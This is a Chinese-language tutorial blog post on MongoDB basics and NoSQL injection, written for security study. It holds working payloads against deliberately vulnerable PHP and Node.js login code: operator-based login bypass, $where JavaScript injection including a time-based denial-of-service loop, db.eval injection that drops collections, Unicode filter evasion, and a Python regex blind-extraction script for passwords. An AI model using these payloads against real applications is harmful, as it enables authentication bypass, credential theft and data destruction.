# Database安全学习—NoSQL

Author: H3rmesk1t

Data: 2021.09.17

# 基本概念
## NoSQL
- Nosql 即 Not Only SQL，在现代的计算系统上每天网络上都会产生庞大的数据量，这些数据有很大一部分是由关系数据库管理系统（RDBMS）来处理； 通过应用实践证明，关系模型是非常适合于客户服务器编程，远远超出预期的利益，今天它是结构化数据存储在网络和商务应用的主导技术
- 与此同时，NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨，NoSQL 的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入

## MongoDB
- MongoDB 属于 NoSQL 数据库的一种，是由C++语言编写的一个基于分布式文件存储的开源数据库系统，旨在为Web应用提供可扩展的高性能数据存储解决方案，在高负载的情况下，添加更多的节点，可以保证服务器性能

## Memcached
- Memcached是一个开源的、支持高性能、高并发的分布式内存缓存系统，由C语言编写

## Redis
- Redis 是一个高性能的 key-value 数据库

# MongoDB 初步
## MongoDB 基础概念解析
- MongoDB 将数据存储为一个文档，数据结构由键值(key=>value)对组成，MongoDB 文档类似于 JSON 对象，字段值可以包含其他文档，数组及文档数组

```sql
{
	"_id" : ObjectId("60fa854cf8aaaf4f21049148"),
	"name" : "whoami",
	"description" : "the admin user",
	"age" : 20,
	"status" : "D",
	"groups" : [
		"admins",
		"users"
	]
}
```
|SQL 概念| MongoDB 概念 |说明|
|--|--|--|
| database| database |数据库|
|tables|collection|数据库表/集合|
|row|document|数据记录行/文档|
|column|field|数据字段/域|
|index|index|索引|
|tables joins||表连接，MongoDB不支持|
|primary key|primary key|主键，MongoDB自动将`_id`字段设置为主键|

### 数据库（Database）
- 一个 MongoDB 中可以建立多个数据库，MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中

- 使用 `show dbs` 显示所有的数据库的列表
- 使用 `db` 显示当前数据库对象或集合

![在这里插入图片描述](https://img-blog.csdnimg.cn/5f6eb6bafc804ce5b24d4b5423b2884e.png#pic_center)

### 文档（Document）
- 文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行，MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点，例如

```sql
{"username":"H3rmesk1t","password":"flag{ef5b8877-c871-4832-8c88-57dd2397a04c}"}
```

### 集合（Collection）
- 集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格，集合存在于数据库中，集合没有固定的结构，这意味着可以对集合可以插入不同格式和类型的数据，例如

```sql
{"username":"H3rmesk1t"}
{"username":"H3rmesk1t","password":"flag{ef5b8877-c871-4832-8c88-57dd2397a04c}"}
{"username":"H3rmesk1t","password":"flag{ef5b8877-c871-4832-8c88-57dd2397a04c}","ways":["Misc","Web"]}
```
- 当插入文档时集合会被自动创建
- 可以用 `show collections` 或者 `show tables` 命令查看存在的集合

![在这里插入图片描述](https://img-blog.csdnimg.cn/2757bbbba9d64886ae5e785b5242d961.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
## MongoDB 基础语法解析
### MongoDB 创建数据库
- MongoDB 创建数据库的命令为：`use DATABASE_NAME`，当数据库不存在时会自动创建数据库；当数据库存在时会切换到指定的数据库

![在这里插入图片描述](https://img-blog.csdnimg.cn/9da0d0b650534d829baf0ce4ed3485d4.png#pic_center)
### MongoDB 创建集合
- 使用 `createCollection` 的方法来创建集合，命令为 `db.createCollection(name, options)`，其中 `name` 是待创建集合的名称，`options` 是可选参数用来指定有关内存大小及索引的选项

![在这里插入图片描述](https://img-blog.csdnimg.cn/cb2df577dba44e518a15ae6ace11117c.png#pic_center)
### MongoDB 插入文档
- 使用 `insert` 方法向集合中插入文档，命令为 `db.COLLECTION_NAME.insert(document)` 

![在这里插入图片描述](https://img-blog.csdnimg.cn/456c697f303c445393c241c192d9bea8.png#pic_center)
### MongoDB 更新文档
- 使用 `update` 或者 `save` 方法来更新集合中的文档

#### update 方法
```sql
db.collection.update(
   <query>,
   <update>,
   {
     upsert: <boolean>,
     multi: <boolean>,
     writeConcern: <document>
   }
)

参数说明：
query：update 操作的查询条件, 类似 sql update 语句中 where 子句后面的内容
update：update 操作的对象和一些更新的操作符（如 $set）等, 可以理解为 sql update 语句中 set 关键字后面的内容
multi：可选，默认是 false, 只更新找到的第一条记录, 如果这个参数为 true, 就把按条件查出来多条记录全部更新
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5f3bf5b6c4d645ecb9f7b89fd92d4e25.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
- 修改多条相同的文档，则需要设置 multi 参数为 true

```sql
db.person.update({'usernmae':'admin'},{$set:{'username':'H3rmesk1t'}},{multi:true})
```
#### save 方法
- `save` 方法通过传入的文档来替换已有的文档，`_id` 主键存在就会更新，如果不存在的话则会插入

```sql
db.collection.save(
   <document>,
   {
     writeConcern: <document>
   }
)

参数说明：
document：文档数据
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/289e31d671a343b395d3502baa17bfd9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
### MongoDB 查询文档
- 使用 `find` 方法来查询文档，`find` 方法以非结构化的方法来显示所有文档
- 需要以易读的方式来读取数据的话，可以使用 `pretty` 方法以格式化的方式来显示所有文档

```sql
db.collection.find(query, projection)

参数说明：
query：可选, 使用查询操作符指定查询条件, 相当于 sql select 语句中的 where 子句
projection：可选, 使用投影操作符指定返回的键
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3911e06d66ed4519ae9f1eea2c24a047.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
### MongoDB 与 RDBMS Where 语句的比较
|操作|格式  |语句|RDBMS类似语句|
|--|--|--|--|
| = |{< key >:< value >}  |db.person.find({'username':'admin'}).pretty()|where name =  'admin'|
|<|{< key >:{$lt:< value >}}|db.person.find({'age':'{$lt:20}}).pretty()|where age < 20|
|<=|{< key >:{$lte:< value >}}|db.person.find({'age':'{$lte:20}}).pretty()|where age <= 20|
|>|{< key >:{$gt:< value >}}|db.person.find({'age':'{$gt:20}}).pretty()|where age 20|
|>=|{< key >:{$gte:< value >}}|db.person.find({'age':'{$gte:20}}).pretty()|where age >= 20|
|!=|{< key >:{$ne:< value >}}|db.person.find({'age':'{$ne:20}}).pretty()|where age != 20|

### MongoDB AND 条件
- MongoDB 中的 `find` 方法可以传入多个键值对，每个键值对以逗号隔开，即常规 SQL 的 AND 条件，类似于 RDBMS 中的 WHERE 语句：`WHERE username='H3rmesk1t' AND password='flag{ec5e5cea-e23d-4ad7-b3fc-18c6236bc3ee}'`

![在这里插入图片描述](https://img-blog.csdnimg.cn/c170fe0b99974b4390a6ad236b7656a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
### MongoDB OR 条件
- MongoDB OR 条件语句使用了关键字 `$or` 来表示，命令如下

```sql
db.collection.find(
   {
      $or: [
         {key1: value1}, {key2:value2}
      ]
   }
).pretty()
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0338f2f2aaa84073b6535049e5f9dd52.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
### AND 和 OR 联合使用
以下实例演示了 AND 和 OR 联合使用，类似于 RDBMS 中的 WHERE 语句： `where age>19 AND (name='whoami' OR status='A')`

```sql
db.all_users.find({"age":{$gt:19}, $or: [{"name":"whoami"}, {"status":"A"}]})
{ "_id" : ObjectId("60fa9176f8aaaf4f21049150"), "name" : "whoami", "description" : "the admin user", "age" : 20, "status" : "A", "groups" : [ "admins", "users" ] }
```
# Nosql注入简介
- 这里参考 OWASP 对 Nosql 的介绍

```a
NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren’t using the traditional SQL syntax. Because these NoSQL injection attacks may execute within a procedural language, rather than in the declarative SQL language, the potential impacts are greater than traditional SQL injection.

NoSQL database calls are written in the application’s programming language, a custom API call, or formatted according to a common convention (such as XML, JSON, LINQ, etc). Malicious input targeting those specifications may not trigger the primarily application sanitization checks. For example, filtering out common HTML special characters such as < & ; will not prevent attacks against a JSON API, where special characters include / { } :
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/db81af044981477bb5ca5793f4866bee.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
- SQL 注入使攻击者可以在数据库中 SQL 执行命令，与关系数据库不同，NoSQL 数据库不使用通用查询语言，NoSQL 查询语法是特定于产品的，查询是使用应用程序的编程语言编写的：PHP，JavaScript，Python，Java 等，这会导致当成功的注入时，攻击者不仅可以在数据库中执行命令，而且可以在应用程序本身中执行命令

# Nosql 注入的分类
- 按照语言分类：PHP 数组注入、JavaScript 注入、Mongo Shell 拼接注入等
- 按照攻击机制分类：重言式注入、联合查询注入、JavaScript 注入、盲注等

```a
重言式注入：
又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制

联合查询注入：
联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据

JavaScript 注入
MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改

盲注
当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注
```
# PHP 中的 MongoDB 注入
## 重言式注入
- 在 MongoDB 中插入文档数据

![在这里插入图片描述](https://img-blog.csdnimg.cn/65bd560b0ba147749fa5b70f3f07f34d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

- index.php 内容如下

```php
<?php 
show_source();

$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];

$query = new MongoDB\Driver\Query(array(
	'username' =$username,
	'password' =$password
));

$result = $manager->executeQuery('test.users', $query)->toArray();
$count = count($result);
if ($count 0) {
	foreach ($result as $user) {
		$user = ((array)$user);
		echo "Login Success".PHP_EOL;
		echo 'username:' . $user['username'].PHP_EOL;
		echo 'password:' . $user['password'].PHP_EOL;
	}
} else {
	echo 'Login Failed';
}
?>
```

- 模拟登录 admin 用户 POST 数据
```a
username=admin&password=admin123
```
- 进入到 PHP 后数据变为
```php
array(
	'username' ='admin',
	'password' ='admin123'
)
```
- 进入 MongoDB 后执行的查询命令为
```sql
db.users.find({'username':'admin', 'password':'admin123'})

{ "_id" : ObjectId("61445fbaa7a3dc15f3ac9c91"), "username" : "admin", "password" : "admin123" }
```
- 从上面的查询代码中可以看出，对输入没有做任何的过滤与校验，这里可以通过 `$ne` 关键词来构造一个永真的条件绕过，从而来达到 Nosql 注入

```sql
usernmae[$ne]=0&password[$ne]=0
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/9c3d555dd73b457daa4d8bd3e4c5a226.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/88e42bdebe6d443b91405454ab7fc57c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

- 其传入 MongoDB 之后执行的查询命令为

```sql
db.users.find({'username':{$ne:1}, 'password':{$ne:1}})

{ "_id" : ObjectId("61445fbaa7a3dc15f3ac9c91"), "username" : "admin", "password" : "admin123" }
{ "_id" : ObjectId("61445fd0a7a3dc15f3ac9c92"), "username" : "Gyan", "password" : "20080826" }
{ "_id" : ObjectId("61445fe1a7a3dc15f3ac9c93"), "username" : "guest", "password" : "guest" }
{ "_id" : ObjectId("61445fe7a7a3dc15f3ac9c94"), "username" : "demo", "password" : "demo" }
{ "_id" : ObjectId("61445ff9a7a3dc15f3ac9c95"), "username" : "Tom", "password" : "123456" }
```

- 由于 users 集合中 username 和 password 都不等于 1，所以会将所有的文档数据都查询出来
- 从 PHP 角度来看，由于其自身松散的数组特性，导致发送 `value[$ne]=1` 的数据后，PHP 会将其转换为数组 `value=array($ne=>1)`，进入 mongoDB 后，之前单一的 `{'value':1}` 查询就变成了 `{'value':{$ne:1}}` 查询

- 类似的 Payload，常用来验证网站是否存在 Nosql 注入的第一步
```sql
username[$ne]=0&password[$ne]=0
username[$lt]=0&password[$lt]=0
username[$lte]=0&password[$lte]=0
username[$gt]=0&password[$gt]=0
username[$gte]=0&password[$gte]=0
```
## 联合查询注入
- 在 MongoDB 之类的流行数据库存储中，JSON 查询结构使得联合查询注入攻击变得更加复杂，但是当后端的 MongoDB 查询语句使用了字符串拼接时，Nosql 已经存在联合查询注入的问题

```sql
string query = "{username:'" + $username + "', password:'" + $password + "'}"
```
- 当输入正确的用户名和密码进行登录时，查询语句是

```sql
{'usernmae':'admin', 'password':'admin123'}
```
- 但由于没有很好地对输入的数据进行过滤和校验，攻击者可以构造如下 Payload 进行攻击

```sql
username=admin', $or: [ {}, {'a': 'a&password='}], $comment: '123456
```
- 后端拼接后，语句如下，此时只要用户名是正确的这个查询就可以成功，这种手法与 SQL 注入比较相似
- 这样原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 () 内的条件总是永真的

```sql
{'username':'admin', $or: [ {}, {'a': 'a', password:''}], $comment: '123456'}

select * from logins where username = 'admin' and (password true<or ('a'='a' and password = '')))
```
## JavaScript 注入

- MongoDB Server 是支持 JavaScript 的，可以使用 JavaScript 进行一些复杂事务和查询，也允许在查询的时候执行 JavaScript 代码，但是如果传递不干净的用户输入到这些查询中，则可能会注入任意的 JavaScript 代码，导致非法的数据获取或篡改

### $where 操作符
- 先了解一下 `$where` 操作符，在 MongoDB 中，`$where` 操作符可以用来执行 JavaScript 代码，将 JavaScript 表达式的字符串或 JavaScript 函数作为查询语句的一部分，在 MongoDB 2.4 之前，通过 `$where` 操作符使用 map-reduce、group 命令甚至可以访问到 Mongo Shell 中的全局函数和属性，如 db，也就是说可以在自定义的函数里获取数据库的所有信息

```sql
db.users.find({ $where: "function(){return(this.username == 'admin')}" })

{ "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "admin", "password" : "admin123" }
```
- 使用 `$where` 关键字后，JavaScript 将会执行并返回 "admin"，然后查询出 username 为 admin 的数据
- 某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 `$username` 获取查询条件：
```sql
db.users.find({ $where: "function(){return(this.username == $username)}" })
```
- 接着攻击者可以注入恶意的字符串，例如 `'d1no'; sleep(5000)` ，此时 MongoDB 执行的查询语句为
```sql
db.users.find({ $where: "function(){return(this.username == 'd1no'; sleep(5000))}" })
```
- 如果此时服务器有 5 秒钟的延迟则说明注入成功

- index.php 内容如下

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];
$function = "
function() { 
	var username = '".$username."';
	var password = '".$password."';
	if(username == 'admin' && password == 'admin123'){
		return true;
	}else{
		return false;
	}
}";
$query = new MongoDB\Driver\Query(array(
    '$where' =$function
));
$result = $manager->executeQuery('test.users', $query)->toArray();
$count = count($result);
if ($count 0) {
	foreach ($result as $user) {
		$user = ((array)$user);
		echo "Login Success".PHP_EOL;
		echo 'username:' . $user['username'].PHP_EOL;
		echo 'password:' . $user['password'].PHP_EOL;
	}
} else {
	echo 'Login Failed';
}
?>
```
#### MongoDB 2.4 之前

- 如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名
```sql
username=1&password=1';(function(){return(tojson(db.getCollectionNames()))})();var a='1
```
#### MongoDB 2.4 之后
- MongoDB 2.4 之后 db 属性访问不到了，但应然可以构造万能密码，如果此时发送以下这几种数据
```sql
username=1&password=1';return true//
或
username=1&password=1';return true;var a='1
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6e5e39a1dd2040c7bf5c10dad77a3deb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
- 在后端处理的 PHP 数据如下

```php

array(
    '$where' ="
    function() { 
		var username = '1';
		var password = '1';return true;var a='1';
		if(username == 'admin' && password == '123456'){
			return true;
		}else{
			return false;
		}
	}
")
```
- 在 MongoDB 中执行的查询命令为

```sql

db.users.find({$where: "function() { var username = '1';var password = '1';return true;var a='1';if(username == 'admin' && password == '123456'){ return true; }else{ return false; }}"})

{ "_id" : ObjectId("61445fbaa7a3dc15f3ac9c91"), "username" : "admin", "password" : "admin123" }
{ "_id" : ObjectId("61445fd0a7a3dc15f3ac9c92"), "username" : "Gyan", "password" : "20080826" }
{ "_id" : ObjectId("61445fe1a7a3dc15f3ac9c93"), "username" : "guest", "password" : "guest" }
{ "_id" : ObjectId("61445fe7a7a3dc15f3ac9c94"), "username" : "demo", "password" : "demo" }
{ "_id" : ObjectId("61445ff9a7a3dc15f3ac9c95"), "username" : "Tom", "password" : "123456" }
```

- 从上面的注入过程中不难看出 password 中的 `return true` 让整个 JavaScript 代码提前结束并返回了 true，成功构造出一个永真条件来绕过并完成 Nosql 注入

- DOS类攻击 Payload
```sql
username=1&password=1';(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return Math.max();})();var a='1
```
### Command 方法注入
- MongoDB Driver 一般都提供直接执行 Shell 命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用，在 MongoDB 的服务器端可以通过 `db.eval` 方法来执行 JavaScript 脚本例如可以定义一个 JavaScript 函数，然后通过 `db.eval` 在服务器端来运行

```php

<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];

$cmd = new MongoDB\Driver\Command( [
    'eval' ="db.users.distinct('username',{'username':'$username'})"
] );

$result = $manager->executeCommand('test.users', $cmd)->toArray();
$count = count($result);
if ($count 0) {
    foreach ($result as $user) {
        $user = ((array)$user);
        echo '====Login Success====<br>';
        echo 'username:' . $user['username'] . '<br>';
        echo 'password:' . $user['password'] . '<br>';
    }
}
else{
    echo 'Login Failed';
}
?>
```
- Payload如下

```sql
username=1'});db.users.drop();db.user.find({'username':'1
username=1'});db.users.insert({"username":"admin","password":123456"});db.users.find({'username':'1
```
## 布尔盲注
- 当页面没有回显时可以通过 `$regex` 正则表达式来进行盲注，`$regex` 可以达到和传统 SQL 注入中 `substr` 函数相同的功能

```php
<?php
show_source();

$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];

$query = new MongoDB\Driver\Query(array(
    'username' =$username,
    'password' =$password
));

$result = $manager->executeQuery('test.users', $query)->toArray();
$count = count($result);
if ($count 0) {
    foreach ($result as $user) {
        $user = ((array)$user);
        echo '====Login Success====<br>';
        echo 'username:' . $user['username'] . '<br>';
        echo 'password:' . $user['password'] . '<br>';
    }
}
else{
    echo 'Login Failed';
}
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2233fe56eee9410dbf4961d668342f90.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/9d6cb26455c64b6da4161c7b5ec408dc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDNybWVzazF0,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

- 当 `password[$regex]=.{8}` 时可以成功登录，但在 `password[$regex]=.{9}` 时登录失败，说明 admin 用户的密码长度为 6
- 当知道 password 的长度之后便可以逐位提取 password 的字符了

```sql
username=admin&password[$regex]=a.{7}
或
username=admin&password[$regex]=^a
```

- Nosql 盲注脚本

```python
import requests
import string

password = ''
url = 'http://127.0.0.1/html/demo.php'

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            
            # When the method is GET
            get_payload = '?username=admin&password[$regex]=^%s' % (password + c)
            # When the method is POST
            post_payload = {
                "username": "admin",
                "password[$regex]": '^' + password + c
            }
            # When the method is POST with JSON
            json_payload = """{"username":"admin", "password":{"$regex":"^%s"}}""" % (password + c)
            #headers = {'Content-Type': 'application/json'}
            #r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json
            
            r = requests.post(url=url, data=post_payload)
            if 'Login Success' in r.text:
                print("[+] %s" % (password + c))
                password += c
```
# Nodejs 中的 MongoDB 注入

- 在 Nodejs 中也存在 MongoDB 注入的问题，其中主要是重言式注入，通过构造永真式构造万能密码实现登录绕过

```javascript
server.js

var express = require('express');
var mongoose = require('mongoose');
var jade = require('jade');
var bodyParser = require('body-parser');

mongoose.connect('mongodb://localhost/test', { useNewUrlParser: true });
var UserSchema = new mongoose.Schema({
    name: String,
    username: String,
    password: String
});
var User = mongoose.model('users', UserSchema);
var app = express();

app.set('views', __dirname);
app.set('view engine', 'jade');

app.get('/', function(req, res) {
    res.render ("index.jade",{
        message: 'Please Login'
    });
});

app.use(bodyParser.json());

app.post('/', function(req, res) {
    console.log(req.body)
    User.findOne({username: req.body.username, password: req.body.password}, function (err, user) {
        console.log(user)
        if (err) {
            return res.render('index.jade', {message: err.message});
        }
        if (!user) {
            return res.render('index.jade', {message: 'Login Failed'});
        }
        
        return res.render('index.jade', {message: 'Welcome back ' + user.name + '!'});
    });
});

var server = app.listen(8000, '0.0.0.0', function () {

    var host = server.address().address
    var port = server.address().port

    console.log("listening on http://%s:%s", host, port)
});

index.js

h1 #{message}
p #{message}
```

- 发送 JSON 格式的 Payload：`{"username":{"$ne":1},"password": {"$ne":1}}`
- 在处理 MongoDB 查询时，经常会使用 JSON 格式将用户提交的数据发送到服务端，如果目标过滤了 `$ne` 等关键字，可以使用 Unicode 编码绕过，这是因为 JSON 可以直接解析 Unicode

```sql
{"username":{"\u0024\u006e\u0065":1},"password": {"\u0024\u006e\u0065":1}}
// {"username":{"$ne":1},"password": {"$ne":1}}
```

# Nosql 注入相关工具
- [项目地址](https://github.com/youngyangyang04/NoSQLAttack)

# 参考文章
- [文章地址](https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/)